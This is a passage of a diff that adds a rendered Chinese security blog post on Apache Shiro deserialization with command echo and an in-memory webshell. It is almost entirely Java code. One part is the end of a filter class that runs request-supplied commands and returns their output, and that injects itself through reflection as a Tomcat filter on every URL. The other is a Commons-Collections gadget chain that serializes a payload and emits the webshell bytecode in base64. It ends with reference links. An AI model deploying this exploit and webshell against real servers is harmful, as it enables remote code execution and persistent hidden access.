+                <span class="n">Scanner</span> <span class="n">s</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Scanner</span><span class="o">(</span><span class="n">in</span><span class="o">).</span><span class="na">useDelimiter</span><span class="o">(</span><span class="s">&#34;\\\\a&#34;</span><span class="o">);</span>
+                <span class="n">String</span> <span class="n">output</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="na">hasNext</span><span class="o">()</span> <span class="o">?</span> <span class="n">s</span><span class="o">.</span><span class="na">next</span><span class="o">()</span> <span class="o">:</span> <span class="s">&#34;&#34;</span><span class="o">;</span>
+                <span class="n">servletResponse</span><span class="o">.</span><span class="na">getWriter</span><span class="o">().</span><span class="na">println</span><span class="o">(</span><span class="s">&#34;----------------------------------&#34;</span><span class="o">);</span>
+                <span class="n">servletResponse</span><span class="o">.</span><span class="na">getWriter</span><span class="o">().</span><span class="na">println</span><span class="o">(</span><span class="n">output</span><span class="o">);</span>
+                <span class="n">servletResponse</span><span class="o">.</span><span class="na">getWriter</span><span class="o">().</span><span class="na">println</span><span class="o">(</span><span class="s">&#34;----------------------------------&#34;</span><span class="o">);</span>
+                <span class="n">servletResponse</span><span class="o">.</span><span class="na">getWriter</span><span class="o">().</span><span class="na">flush</span><span class="o">();</span>
+                <span class="n">servletResponse</span><span class="o">.</span><span class="na">getWriter</span><span class="o">().</span><span class="na">close</span><span class="o">();</span>
+            <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+                <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+            <span class="o">}</span>
+            <span class="k">return</span><span class="o">;</span>
+        <span class="o">}</span>
+        <span class="k">try</span> <span class="o">{</span>
+            <span class="n">filterChain</span><span class="o">.</span><span class="na">doFilter</span><span class="o">(</span><span class="n">servletRequest</span><span class="o">,</span> <span class="n">servletResponse</span><span class="o">);</span>
+        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">IOException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+
+    <span class="nd">@Override</span>
+    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">destroy</span><span class="o">()</span> <span class="o">{</span>
+
+    <span class="o">}</span>
+    <span class="nd">@Override</span>
+    <span class="kd">public</span> <span class="kt">boolean</span> <span class="nf">equals</span><span class="o">(</span><span class="n">Object</span> <span class="n">req</span><span class="o">)</span> <span class="o">{</span>
+        <span class="n">Object</span><span class="o">[]</span> <span class="n">context</span><span class="o">=(</span><span class="n">Object</span><span class="o">[])</span> <span class="n">req</span><span class="o">;</span>
+        <span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">catalina</span><span class="o">.</span><span class="na">connector</span><span class="o">.</span><span class="na">Request</span> <span class="n">request</span><span class="o">=(</span><span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">catalina</span><span class="o">.</span><span class="na">connector</span><span class="o">.</span><span class="na">Request</span><span class="o">)</span><span class="n">context</span><span class="o">[</span><span class="n">0</span><span class="o">];</span>
+        <span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">catalina</span><span class="o">.</span><span class="na">connector</span><span class="o">.</span><span class="na">Response</span> <span class="n">response</span><span class="o">=(</span><span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">catalina</span><span class="o">.</span><span class="na">connector</span><span class="o">.</span><span class="na">Response</span><span class="o">)</span><span class="n">context</span><span class="o">[</span><span class="n">1</span><span class="o">];</span>
+        <span class="k">try</span><span class="o">{</span>
+            <span class="n">String</span> <span class="n">name</span><span class="o">=</span><span class="s">&#34;wotaifu&#34;</span><span class="o">;</span>
+            <span class="n">ServletContext</span> <span class="n">servletContext</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">getSession</span><span class="o">().</span><span class="na">getServletContext</span><span class="o">();</span>
+
+            <span class="n">Field</span> <span class="n">appctx</span> <span class="o">=</span> <span class="n">servletContext</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">&#34;context&#34;</span><span class="o">);</span>
+            <span class="n">appctx</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+            <span class="n">ApplicationContext</span> <span class="n">applicationContext</span> <span class="o">=</span> <span class="o">(</span><span class="n">ApplicationContext</span><span class="o">)</span> <span class="n">appctx</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">servletContext</span><span class="o">);</span>
+
+            <span class="n">Field</span> <span class="n">stdctx</span> <span class="o">=</span> <span class="n">applicationContext</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">&#34;context&#34;</span><span class="o">);</span>
+            <span class="n">stdctx</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+            <span class="n">StandardContext</span> <span class="n">standardContext</span> <span class="o">=</span> <span class="o">(</span><span class="n">StandardContext</span><span class="o">)</span> <span class="n">stdctx</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">applicationContext</span><span class="o">);</span>
+
+            <span class="n">Field</span> <span class="n">Configs</span> <span class="o">=</span> <span class="n">standardContext</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">&#34;filterConfigs&#34;</span><span class="o">);</span>
+            <span class="n">Configs</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+            <span class="n">Map</span> <span class="n">filterConfigs</span> <span class="o">=</span> <span class="o">(</span><span class="n">Map</span><span class="o">)</span> <span class="n">Configs</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">standardContext</span><span class="o">);</span>
+            <span class="k">if</span> <span class="o">(</span><span class="n">filterConfigs</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">name</span><span class="o">)</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+                <span class="n">Filter</span> <span class="n">filter</span> <span class="o">=</span> <span class="k">new</span> <span class="n">memery</span><span class="o">();</span>
+                <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&#34;123456&#34;</span><span class="o">);</span>
+                <span class="c1">//添加filter到filterDef
+</span><span class="c1"></span>                <span class="n">FilterDef</span> <span class="n">filterDef</span> <span class="o">=</span> <span class="k">new</span> <span class="n">FilterDef</span><span class="o">();</span>
+                <span class="n">filterDef</span><span class="o">.</span><span class="na">setFilter</span><span class="o">(</span><span class="n">filter</span><span class="o">);</span>
+                <span class="n">filterDef</span><span class="o">.</span><span class="na">setFilterName</span><span class="o">(</span><span class="n">name</span><span class="o">);</span>
+                <span class="n">filterDef</span><span class="o">.</span><span class="na">setFilterClass</span><span class="o">(</span><span class="n">filter</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getName</span><span class="o">());</span>
+                <span class="c1">//添加filterDef到filterDefs中
+</span><span class="c1"></span>                <span class="n">standardContext</span><span class="o">.</span><span class="na">addFilterDef</span><span class="o">(</span><span class="n">filterDef</span><span class="o">);</span>
+                <span class="c1">//创建FilterMap
+</span><span class="c1"></span>                <span class="n">FilterMap</span> <span class="n">filterMap</span> <span class="o">=</span> <span class="k">new</span> <span class="n">FilterMap</span><span class="o">();</span>
+                <span class="n">filterMap</span><span class="o">.</span><span class="na">addURLPattern</span><span class="o">(</span><span class="s">&#34;/*&#34;</span><span class="o">);</span>
+                <span class="n">filterMap</span><span class="o">.</span><span class="na">setFilterName</span><span class="o">(</span><span class="n">name</span><span class="o">);</span>
+                <span class="n">filterMap</span><span class="o">.</span><span class="na">setDispatcher</span><span class="o">(</span><span class="n">DispatcherType</span><span class="o">.</span><span class="na">REQUEST</span><span class="o">.</span><span class="na">name</span><span class="o">());</span>
+                <span class="c1">//将该FilterMap添加到最前面
+</span><span class="c1"></span>                <span class="n">standardContext</span><span class="o">.</span><span class="na">addFilterMapBefore</span><span class="o">(</span><span class="n">filterMap</span><span class="o">);</span>
+                <span class="c1">//创建ApplicationFilterConfig类, 并将它添加到filterConfigs中
+</span><span class="c1"></span>                <span class="n">Constructor</span> <span class="n">constructor</span> <span class="o">=</span> <span class="n">ApplicationFilterConfig</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getDeclaredConstructor</span><span class="o">(</span><span class="n">Context</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">FilterDef</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
+                <span class="n">constructor</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+                <span class="n">ApplicationFilterConfig</span> <span class="n">filterConfig</span> <span class="o">=</span> <span class="o">(</span><span class="n">ApplicationFilterConfig</span><span class="o">)</span> <span class="n">constructor</span><span class="o">.</span><span class="na">newInstance</span><span class="o">(</span><span class="n">standardContext</span><span class="o">,</span> <span class="n">filterDef</span><span class="o">);</span>
+                <span class="n">filterConfigs</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="n">name</span><span class="o">,</span> <span class="n">filterConfig</span><span class="o">);</span>
+                <span class="n">response</span><span class="o">.</span><span class="na">getWriter</span><span class="o">().</span><span class="na">println</span><span class="o">(</span><span class="s">&#34;Success&#34;</span><span class="o">);</span>
+                <span class="n">response</span><span class="o">.</span><span class="na">getWriter</span><span class="o">().</span><span class="na">flush</span><span class="o">();</span>
+                <span class="n">response</span><span class="o">.</span><span class="na">getWriter</span><span class="o">().</span><span class="na">close</span><span class="o">();</span>
+            <span class="o">}</span>
+        <span class="o">}</span><span class="k">catch</span><span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">){</span>
+            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+        <span class="o">}</span>
+        <span class="k">return</span> <span class="kc">true</span><span class="o">;</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></td></tr></table></div>
+</div>
+</div><p><strong>run代码实现</strong></p>
+<p>这里和回显部分相同</p>
+<div class="highlight"><div class="chroma">
+<div class="table-container"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">  1
+</span><span class="lnt">  2
+</span><span class="lnt">  3
+</span><span class="lnt">  4
+</span><span class="lnt">  5
+</span><span class="lnt">  6
+</span><span class="lnt">  7
+</span><span class="lnt">  8
+</span><span class="lnt">  9
+</span><span class="lnt"> 10
+</span><span class="lnt"> 11
+</span><span class="lnt"> 12
+</span><span class="lnt"> 13
+</span><span class="lnt"> 14
+</span><span class="lnt"> 15
+</span><span class="lnt"> 16
+</span><span class="lnt"> 17
+</span><span class="lnt"> 18
+</span><span class="lnt"> 19
+</span><span class="lnt"> 20
+</span><span class="lnt"> 21
+</span><span class="lnt"> 22
+</span><span class="lnt"> 23
+</span><span class="lnt"> 24
+</span><span class="lnt"> 25
+</span><span class="lnt"> 26
+</span><span class="lnt"> 27
+</span><span class="lnt"> 28
+</span><span class="lnt"> 29
+</span><span class="lnt"> 30
+</span><span class="lnt"> 31
+</span><span class="lnt"> 32
+</span><span class="lnt"> 33
+</span><span class="lnt"> 34
+</span><span class="lnt"> 35
+</span><span class="lnt"> 36
+</span><span class="lnt"> 37
+</span><span class="lnt"> 38
+</span><span class="lnt"> 39
+</span><span class="lnt"> 40
+</span><span class="lnt"> 41
+</span><span class="lnt"> 42
+</span><span class="lnt"> 43
+</span><span class="lnt"> 44
+</span><span class="lnt"> 45
+</span><span class="lnt"> 46
+</span><span class="lnt"> 47
+</span><span class="lnt"> 48
+</span><span class="lnt"> 49
+</span><span class="lnt"> 50
+</span><span class="lnt"> 51
+</span><span class="lnt"> 52
+</span><span class="lnt"> 53
+</span><span class="lnt"> 54
+</span><span class="lnt"> 55
+</span><span class="lnt"> 56
+</span><span class="lnt"> 57
+</span><span class="lnt"> 58
+</span><span class="lnt"> 59
+</span><span class="lnt"> 60
+</span><span class="lnt"> 61
+</span><span class="lnt"> 62
+</span><span class="lnt"> 63
+</span><span class="lnt"> 64
+</span><span class="lnt"> 65
+</span><span class="lnt"> 66
+</span><span class="lnt"> 67
+</span><span class="lnt"> 68
+</span><span class="lnt"> 69
+</span><span class="lnt"> 70
+</span><span class="lnt"> 71
+</span><span class="lnt"> 72
+</span><span class="lnt"> 73
+</span><span class="lnt"> 74
+</span><span class="lnt"> 75
+</span><span class="lnt"> 76
+</span><span class="lnt"> 77
+</span><span class="lnt"> 78
+</span><span class="lnt"> 79
+</span><span class="lnt"> 80
+</span><span class="lnt"> 81
+</span><span class="lnt"> 82
+</span><span class="lnt"> 83
+</span><span class="lnt"> 84
+</span><span class="lnt"> 85
+</span><span class="lnt"> 86
+</span><span class="lnt"> 87
+</span><span class="lnt"> 88
+</span><span class="lnt"> 89
+</span><span class="lnt"> 90
+</span><span class="lnt"> 91
+</span><span class="lnt"> 92
+</span><span class="lnt"> 93
+</span><span class="lnt"> 94
+</span><span class="lnt"> 95
+</span><span class="lnt"> 96
+</span><span class="lnt"> 97
+</span><span class="lnt"> 98
+</span><span class="lnt"> 99
+</span><span class="lnt">100
+</span><span class="lnt">101
+</span><span class="lnt">102
+</span><span class="lnt">103
+</span><span class="lnt">104
+</span><span class="lnt">105
+</span><span class="lnt">106
+</span><span class="lnt">107
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="kn">package</span> <span class="nn">deserialize</span><span class="o">;</span>
+
+<span class="kn">import</span> <span class="nn">com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">javassist.ClassClassPath</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">javassist.ClassPool</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">javassist.CtClass</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">org.apache.commons.collections.functors.InvokerTransformer</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">org.apache.commons.collections.keyvalue.TiedMapEntry</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">org.apache.commons.collections.map.LazyMap</span><span class="o">;</span>
+
+<span class="kn">import</span> <span class="nn">java.io.*</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.lang.reflect.Field</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.util.Base64</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.util.HashMap</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.util.HashSet</span><span class="o">;</span>
+
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">run</span> <span class="o">{</span>
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
+        <span class="k">try</span><span class="o">{</span>
+            <span class="c1">//获取字节码
+</span><span class="c1"></span>            <span class="n">ClassPool</span> <span class="n">pool</span> <span class="o">=</span> <span class="n">ClassPool</span><span class="o">.</span><span class="na">getDefault</span><span class="o">();</span>
+            <span class="n">pool</span><span class="o">.</span><span class="na">insertClassPath</span><span class="o">(</span><span class="k">new</span> <span class="n">ClassClassPath</span><span class="o">(</span><span class="n">deserialize</span><span class="o">.</span><span class="na">run</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getClass</span><span class="o">()));</span>
+            <span class="n">CtClass</span> <span class="n">ctClass</span> <span class="o">=</span> <span class="n">pool</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="s">&#34;deserialize.TD&#34;</span><span class="o">);</span>
+            <span class="n">ctClass</span><span class="o">.</span><span class="na">setSuperclass</span><span class="o">(</span><span class="n">pool</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">AbstractTranslet</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getName</span><span class="o">()));</span>
+            <span class="kt">byte</span><span class="o">[]</span> <span class="n">classBytes</span> <span class="o">=</span> <span class="n">ctClass</span><span class="o">.</span><span class="na">toBytecode</span><span class="o">();</span>
+
+            <span class="n">CtClass</span> <span class="n">ctClass2</span> <span class="o">=</span> <span class="n">pool</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="s">&#34;deserialize.memery&#34;</span><span class="o">);</span>
+            <span class="kt">byte</span><span class="o">[]</span> <span class="n">classBytes2</span> <span class="o">=</span> <span class="n">ctClass2</span><span class="o">.</span><span class="na">toBytecode</span><span class="o">();</span>
+            <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&#34;post请求参数wangdefu\\n&#34;</span><span class="o">+</span><span class="n">Base64</span><span class="o">.</span><span class="na">getEncoder</span><span class="o">().</span><span class="na">encodeToString</span><span class="o">(</span><span class="n">classBytes2</span><span class="o">));</span>
+
+            <span class="kt">byte</span><span class="o">[][]</span> <span class="n">targetByteCodes</span> <span class="o">=</span> <span class="k">new</span> <span class="kt">byte</span><span class="o">[][]{</span><span class="n">classBytes</span><span class="o">};</span>
+            <span class="n">TemplatesImpl</span> <span class="n">templates</span> <span class="o">=</span> <span class="n">TemplatesImpl</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">newInstance</span><span class="o">();</span>
+
+            <span class="n">Field</span> <span class="n">f0</span> <span class="o">=</span> <span class="n">templates</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">&#34;_bytecodes&#34;</span><span class="o">);</span>
+            <span class="n">f0</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+            <span class="n">f0</span><span class="o">.</span><span class="na">set</span><span class="o">(</span><span class="n">templates</span><span class="o">,</span><span class="n">targetByteCodes</span><span class="o">);</span>
+
+            <span class="n">f0</span> <span class="o">=</span> <span class="n">templates</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">&#34;_name&#34;</span><span class="o">);</span>
+            <span class="n">f0</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+            <span class="n">f0</span><span class="o">.</span><span class="na">set</span><span class="o">(</span><span class="n">templates</span><span class="o">,</span><span class="s">&#34;name&#34;</span><span class="o">);</span>
+
+            <span class="n">f0</span> <span class="o">=</span> <span class="n">templates</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">&#34;_class&#34;</span><span class="o">);</span>
+            <span class="n">f0</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+            <span class="n">f0</span><span class="o">.</span><span class="na">set</span><span class="o">(</span><span class="n">templates</span><span class="o">,</span><span class="kc">null</span><span class="o">);</span>
+            <span class="c1">//最终要调用到TemplatesImpl的newTransformer()方法
+</span><span class="c1"></span>
+            <span class="n">InvokerTransformer</span> <span class="n">transformer</span> <span class="o">=</span> <span class="k">new</span> <span class="n">InvokerTransformer</span><span class="o">(</span><span class="s">&#34;asdfasdfasdf&#34;</span><span class="o">,</span> <span class="k">new</span> <span class="n">Class</span><span class="o">[</span><span class="n">0</span><span class="o">],</span> <span class="k">new</span> <span class="n">Object</span><span class="o">[</span><span class="n">0</span><span class="o">]);</span>
+            <span class="n">HashMap</span> <span class="n">innermap</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">();</span>
+            <span class="n">LazyMap</span> <span class="n">map</span> <span class="o">=</span> <span class="o">(</span><span class="n">LazyMap</span><span class="o">)</span><span class="n">LazyMap</span><span class="o">.</span><span class="na">decorate</span><span class="o">(</span><span class="n">innermap</span><span class="o">,</span><span class="n">transformer</span><span class="o">);</span>
+            <span class="c1">//利用LazyMap的get()来触发transform()。TiedMapEntry类的getValue()调用LazyMap的get()方法
+</span><span class="c1"></span>            <span class="n">TiedMapEntry</span> <span class="n">tiedmap</span> <span class="o">=</span> <span class="k">new</span> <span class="n">TiedMapEntry</span><span class="o">(</span><span class="n">map</span><span class="o">,</span><span class="n">templates</span><span class="o">);</span>
+            <span class="c1">//触发点: 在Hashset的readObject方法中，会去调用map的put方法，这里的map为Hashmap的对象，然后会逐步调用到TiedMapEntry类的getValue()方法
+</span><span class="c1"></span>
+            <span class="c1">//查一下hashSet
+</span><span class="c1"></span>            <span class="n">HashSet</span> <span class="n">hashset</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashSet</span><span class="o">(</span><span class="n">1</span><span class="o">);</span>
+            <span class="n">hashset</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="s">&#34;foo&#34;</span><span class="o">);</span>
+
+            <span class="n">Field</span> <span class="n">f</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
+            <span class="k">try</span> <span class="o">{</span>
+                <span class="n">f</span> <span class="o">=</span> <span class="n">HashSet</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">&#34;map&#34;</span><span class="o">);</span>
+            <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">NoSuchFieldException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+                <span class="n">f</span> <span class="o">=</span> <span class="n">HashSet</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">&#34;backingMap&#34;</span><span class="o">);</span>
+            <span class="o">}</span>
+            <span class="n">f</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+            <span class="n">HashMap</span> <span class="n">hashset_map</span> <span class="o">=</span> <span class="o">(</span><span class="n">HashMap</span><span class="o">)</span> <span class="n">f</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">hashset</span><span class="o">);</span>
+
+            <span class="n">Field</span> <span class="n">f2</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
+            <span class="k">try</span> <span class="o">{</span>
+                <span class="n">f2</span> <span class="o">=</span> <span class="n">HashMap</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">&#34;table&#34;</span><span class="o">);</span>
+            <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">NoSuchFieldException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+                <span class="n">f2</span> <span class="o">=</span> <span class="n">HashMap</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">&#34;elementData&#34;</span><span class="o">);</span>
+            <span class="o">}</span>
+
+            <span class="n">f2</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+            <span class="n">Object</span><span class="o">[]</span> <span class="n">array</span> <span class="o">=</span> <span class="o">(</span><span class="n">Object</span><span class="o">[])</span><span class="n">f2</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">hashset_map</span><span class="o">);</span>
+
+            <span class="n">Object</span> <span class="n">node</span> <span class="o">=</span> <span class="n">array</span><span class="o">[</span><span class="n">0</span><span class="o">];</span>
+            <span class="k">if</span><span class="o">(</span><span class="n">node</span> <span class="o">==</span> <span class="kc">null</span><span class="o">){</span>
+                <span class="n">node</span> <span class="o">=</span> <span class="n">array</span><span class="o">[</span><span class="n">1</span><span class="o">];</span>
+            <span class="o">}</span>
+            <span class="n">Field</span> <span class="n">keyField</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
+            <span class="k">try</span><span class="o">{</span>
+                <span class="n">keyField</span> <span class="o">=</span> <span class="n">node</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">&#34;key&#34;</span><span class="o">);</span>
+            <span class="o">}</span><span class="k">catch</span><span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">){</span>
+                <span class="n">keyField</span> <span class="o">=</span> <span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">&#34;java.util.MapEntry&#34;</span><span class="o">).</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">&#34;key&#34;</span><span class="o">);</span>
+            <span class="o">}</span>
+            <span class="n">keyField</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+            <span class="n">keyField</span><span class="o">.</span><span class="na">set</span><span class="o">(</span><span class="n">node</span><span class="o">,</span><span class="n">tiedmap</span><span class="o">);</span>
+
+            <span class="n">Field</span> <span class="n">f3</span> <span class="o">=</span> <span class="n">transformer</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">&#34;iMethodName&#34;</span><span class="o">);</span>
+            <span class="n">f3</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+            <span class="n">f3</span><span class="o">.</span><span class="na">set</span><span class="o">(</span><span class="n">transformer</span><span class="o">,</span><span class="s">&#34;newTransformer&#34;</span><span class="o">);</span>
+
+            <span class="n">ObjectOutputStream</span> <span class="n">outputStream</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ObjectOutputStream</span><span class="o">(</span><span class="k">new</span> <span class="n">FileOutputStream</span><span class="o">(</span><span class="s">&#34;./cc11&#34;</span><span class="o">));</span>
+            <span class="n">outputStream</span><span class="o">.</span><span class="na">writeObject</span><span class="o">(</span><span class="n">hashset</span><span class="o">);</span>
+            <span class="n">outputStream</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
+
+            <span class="n">ObjectInputStream</span> <span class="n">inputStream</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ObjectInputStream</span><span class="o">(</span><span class="k">new</span> <span class="n">FileInputStream</span><span class="o">(</span><span class="s">&#34;./cc11&#34;</span><span class="o">));</span>
+            <span class="n">inputStream</span><span class="o">.</span><span class="na">readObject</span><span class="o">();</span>
+
+        <span class="o">}</span><span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">){</span>
+            <span class="c1">//e.printStackTrace();
+</span><span class="c1"></span>        <span class="o">}</span>
+
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></td></tr></table></div>
+</div>
+</div><h2 id="参考"><a href="#参考" class="anchor-link">#</a><a href="#contents:参考" class="headings">参考</a></h2>
+<ol>
+<li>
+<p><a href="https://paper.seebug.org/1503/" target="_blank" rel="noopener">Shiro 反序列化漏洞利用工具编写思路</a></p>
+</li>
+<li>
+<p><a href="https://mp.weixin.qq.com/s?__biz=MzAwNzk0NTkxNw==&amp;mid=2247484622&amp;idx=1&amp;sn=8ec625711dcf87f0b6abe67483f0534d&amp;chksm=9b772f1cac00a60aa465a54bd00751c563f2125c78cc1bbca35c760236e4f67d00671de4496c&amp;scene=126&amp;sessionid=1599445076&amp;key=acec999da27edd25eccc957924f4afa7028aec867e42231763ca219c4505e3d6435f346a8463866e7dc0c19a39a3e0600c538e7202ced833a90e6b7910c12b1859ceeaf33f7222bbee4c2acf2953d8dadf304092bebf5d852fbef62087d185eeae0dc9ee37dcd1e02065ea59869b19c78590fb273ffc696c8a9e08793220b82a&amp;ascene=1&amp;uin=NzUwNTE0NzE4&amp;devicetype=Windows+10+x64&amp;version=62090529&amp;lang=zh_CN&amp;exportkey=A%2FH1km1FzCFyhVMsg9e0Izc%3D&amp;pass_ticket=q0CeoTXZ1bV6z466jICgYA%2ByITdSiD5C8i%2FcAgax7OYgTP7U4OVpwP0Xt5Mdan2e&amp;wx_header=0" target="_blank" rel="noopener">Java代码执行漏洞中类动态加载的应用</a></p>
+</li>
+<li>
+<p><a href="https://mp.weixin.qq.com/s?__biz=MzIwMDk1MjMyMg==&amp;mid=2247484799&amp;idx=1&amp;sn=42e7807d6ea0d8917b45e8aa2e4dba44" target="_blank" rel="noopener">基于全局储存的新思路 | Tomcat的一种通用回显方法研究</a></p>
+</li>
+</ol>
+
+            </div>
+
+            
+    
+    
+        <ul class="post-copyright">
+            <li class="copyright-item author"><span class="copyright-item-text">作者</span>：<a href="https://myzxcg.com/" class="p-author h-card" target="_blank" rel="noopener">myzxcg</a></li>
+            
+                
+                
+                
+                
+                <li class="copyright-item link"><span class="copyright-item-text">链接</span>：<a href="/2021/11/Shiro-%E5%9B%9E%E6%98%BE%E4%B8%8E%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0/" target="_blank" rel="noopener">https://myzxcg.com/2021/11/Shiro-回显与内存马实现/</a></li>
+            
+            <li class="copyright-item license"><span class="copyright-item-text">许可</span>：<a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener">CC BY-NC-SA 4.0</a></li>
+            
+        </ul>
+    
+
+
+
+        </article>
+
+        
+
+        
+
+
+        
+
+
+        
+
+
+        
+    
+    
+        <div class="related-posts">
